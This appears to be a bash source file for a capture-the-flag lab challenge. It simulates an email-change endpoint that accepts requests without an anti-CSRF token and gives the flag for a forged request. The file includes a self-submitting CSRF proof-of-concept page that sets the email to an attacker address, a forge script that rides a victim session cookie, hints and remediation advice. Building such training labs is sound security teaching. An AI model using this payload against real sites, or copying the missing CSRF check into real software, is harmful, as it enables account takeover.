#!/usr/bin/env bash
# =============================================================================
#  Medium — CSRF: Account Email Change
#  Maps to report Check: account-update weaknesses (no CSRF token / SameSite;
#  related to the "password change without current password" takeover path).
#  A state-changing request is accepted with the victim's session but no
#  anti-CSRF token — change their email, trigger takeover, read the flag.
# =============================================================================

csrf_provision() { :; }   # stateless; victim session simulated by a cookie

csrf_handle() {
  case "$REQ_METHOD $REQ_PATH" in
    "POST /api/account/email"|"GET /api/account/email")
      local sess token newmail
      sess="$(mw_cookie session)"
      token="$(mw_hdr X-CSRF-Token)"
      newmail="$(mw_field email)"; [[ -z "$newmail" ]] && newmail="$(mw_query email)"
      if [[ -z "$sess" ]]; then mw_resp "401 Unauthorized" '{"error":"no session"}'; return; fi
      if [[ -n "$token" ]]; then
        mw_resp "403 Forbidden" '{"note":"a CSRF token was supplied — that path is protected; the bug is that it is NOT required"}'
        return
      fi
      if [[ -z "$newmail" ]]; then mw_resp "400 Bad Request" '{"error":"email required"}'; return; fi
      # No CSRF token required + no SameSite => forged cross-site request succeeds.
      mw_resp "200 OK" "{\"victim_email_changed_to\":\"$newmail\",\"csrf_protection\":\"none\",\"password_reset_sent\":true,\"takeover_flag\":\"$(flags_plaintext med-csrf)\"}" ;;
    *) mw_resp "404 Not Found" '{"error":"unknown route"}' ;;
  esac
}

csrf_toolkit() {
  local id="$1"
  toolkit_install_helper "$id" "poc.html" \
"<!-- CSRF PoC: auto-submits an email change using the victim's ambient session.
     No anti-CSRF token, no SameSite cookie => the browser sends it cross-site. -->
<form action=\"http://colab-app/api/account/email\" method=\"POST\">
  <input type=\"hidden\" name=\"email\" value=\"attacker@evil.test\">
</form>
<script>document.forms[0].submit()</script>"
  toolkit_install_helper "$id" "forge.sh" \
"#!/usr/bin/env bash
# Simulate the victim's browser firing the forged request (session cookie ride-along).
exec ./colab-http POST /api/account/email -b 'session=victim-instructor' -d \"email=\${1:-attacker@evil.test}\""
}

register_challenge \
  id="med-csrf" \
  title="CSRF: Account Email Change - Medium" \
  diff="Medium" points="250" penalty="35" \
  owasp="A01:2021 Broken Access Control (CSRF)" \
  cvss="6.5 (AV:N/UI:R)" \
  slug="cross_site_email_swap" \
  finding="CoLab Pentest Report — account-update lacks CSRF token; ties to password-change takeover" \
  endpoint="POST /api/account/email  (no CSRF token / SameSite)" \
  tools="curl,httpie" \
  scenario="The email-change endpoint mutates state but requires no anti-CSRF token and the session cookie has no SameSite protection. A logged-in instructor who visits your page will silently change their account email — the first step of an account takeover." \
  objective="Forge the cross-site email-change request as the victim (their session, no CSRF token) and capture the takeover flag." \
  remediation="Require a per-request CSRF token on state changes; set SameSite=Lax/Strict; re-auth for sensitive changes." \
  hints="The request needs the victim's session cookie but NO X-CSRF-Token header — that's the whole point.
Use -b to ride the victim session:  colab-http POST /api/account/email -b 'session=victim-instructor' -d 'email=attacker@evil.test'.
A ready PoC and forge.sh are in your working dir." \
  provision="csrf_provision" toolkit="csrf_toolkit" handler="csrf_handle"
